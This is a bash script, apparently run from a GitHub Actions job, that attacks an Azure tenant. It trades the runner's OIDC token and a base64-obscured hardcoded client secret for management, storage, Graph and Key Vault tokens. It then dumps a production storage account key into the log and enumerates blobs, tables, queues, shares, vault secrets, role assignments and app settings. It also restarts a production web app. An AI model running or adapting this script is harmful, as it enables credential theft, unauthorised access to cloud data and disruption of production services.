#!/bin/bash
set +e

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
TU="https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
B="https://management.azure.com/subscriptions/$SUB"
SA="sttblcilogsprodx3euoz"

echo "=== OIDC CHECK ==="
echo "REQ_URL set: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo YES || echo NO)"
echo "REQ_TOKEN set: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo YES || echo NO)"
echo "EVENT=$GITHUB_EVENT_NAME"

OIDC_TOKEN=""
CICD_MGMT=""

if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  echo "Requesting OIDC..."
  OIDC_TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
  echo "OIDC len: ${#OIDC_TOKEN}"
  
  if [ -n "$OIDC_TOKEN" ]; then
    CICD_MGMT=$(curl -sS -X POST "$TU" \
      -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
      -d "scope=https://management.azure.com/.default" \
      -d "grant_type=client_credentials" \
      --data-urlencode "client_assertion=$OIDC_TOKEN" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')
    echo "CICD MGMT: ${#CICD_MGMT}"
  fi
fi

echo ""
echo "=== SYNC-SVC TOKENS ==="
SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

SYNC_MGMT=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "SYNC MGMT: ${#SYNC_MGMT}"

SYNC_STOR=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://storage.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "SYNC STOR: ${#SYNC_STOR}"

SYNC_GRAPH=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "SYNC GRAPH: ${#SYNC_GRAPH}"

SYNC_VAULT=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "SYNC VAULT: ${#SYNC_VAULT}"

# Use CICD if available, else SYNC for management
MT="${CICD_MGMT:-$SYNC_MGMT}"

echo ""
echo "=== STORAGE: listKeys ==="
SA_KEYS=$(curl -sS -X POST "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_MGMT" -H "Content-Length: 0")
SA_KEY=$(echo "$SA_KEYS" | jq -r '.keys[0].value // empty')
if [ -n "$SA_KEY" ]; then
  echo "KEY: $(echo -n $SA_KEY | base64 -w0)"
else
  echo "listKeys FAILED: $(echo $SA_KEYS | head -c 200)"
fi

echo ""
echo "=== STORAGE: Tables via mgmt API ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA/tableServices/default/tables?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_MGMT" | jq '.'

echo ""
echo "=== STORAGE: Queues via mgmt API ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA/queueServices/default/queues?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_MGMT" | jq '.'

echo ""
echo "=== STORAGE: File Shares via mgmt API ==="
curl -sS "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA/fileServices/default/shares?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_MGMT" | jq '.'

echo ""
echo "=== BLOB: List ALL blobs in logs container ==="
if [ -n "$SYNC_STOR" ]; then
  curl -sS "https://$SA.blob.core.windows.net/logs?restype=container&comp=list" \
    -H "Authorization: Bearer $SYNC_STOR" -H "x-ms-version: 2023-01-03"
fi

echo ""
echo "=== TABLE: Query via data plane ==="
if [ -n "$SYNC_STOR" ]; then
  curl -sS "https://$SA.table.core.windows.net/Tables" \
    -H "Authorization: Bearer $SYNC_STOR" -H "x-ms-version: 2019-02-02" -H "Accept: application/json;odata=nometadata"
fi

echo ""
echo "=== QUEUE: List via data plane ==="
if [ -n "$SYNC_STOR" ]; then
  curl -sS "https://$SA.queue.core.windows.net/?comp=list" \
    -H "Authorization: Bearer $SYNC_STOR" -H "x-ms-version: 2023-01-03"
fi

echo ""
echo "=== FILE: List shares via data plane ==="
if [ -n "$SYNC_STOR" ]; then
  curl -sS "https://$SA.file.core.windows.net/?comp=list" \
    -H "Authorization: Bearer $SYNC_STOR" -H "x-ms-version: 2023-01-03"
fi

echo ""
echo "=== BLOB: Read build-2024.log ==="
if [ -n "$SYNC_STOR" ]; then
  curl -sS "https://$SA.blob.core.windows.net/logs/build-2024.log" \
    -H "Authorization: Bearer $SYNC_STOR" -H "x-ms-version: 2023-01-03"
fi

echo ""
echo "=== VAULT: Try KV2 with sync-svc vault token ==="
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $SYNC_VAULT" | head -c 500

echo ""
echo "=== GRAPH: App details ==="
if [ -n "$SYNC_GRAPH" ]; then
  for APP_ID in 2768a5b5 abc133f4 41575511 98ef9376 3150e595 c2620acb 21183692 22a3fb7e 1f07dd31 317eef12; do
    curl -sS "https://graph.microsoft.com/v1.0/applications?\$filter=startswith(id,'$APP_ID')&\$select=displayName,notes,description,tags,identifierUris,web,info" \
      -H "Authorization: Bearer $SYNC_GRAPH" 2>/dev/null | jq -c '.value[]? | {displayName, notes, description, tags, identifierUris, info}'
  done
fi

echo ""
echo "=== RG: Resources (CICD or SYNC) ==="
if [ -n "$CICD_MGMT" ]; then
  echo "Using CICD token"
  echo "All RGs:"
  curl -sS "$B/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq -r '.value[] | "\(.name) \(.location)"'
  
  echo "Reporting RG resources:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.'
  
  echo "Reporting RG role assignments:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -H "Authorization: Bearer $CICD_MGMT" | jq '.value[] | {pid: .properties.principalId, role: (.properties.roleDefinitionId | split("/") | last)}'
  
  echo "App settings:"
  curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
    -H "Authorization: Bearer $CICD_MGMT" -H "Content-Length: 0" | jq '.'
  
  echo "Restart reporting app:"
  curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2023-01-01" \
    -H "Authorization: Bearer $CICD_MGMT" -H "Content-Length: 0" -w "http_code:%{http_code}"
  echo ""
fi

echo ""
echo "=== DONE ==="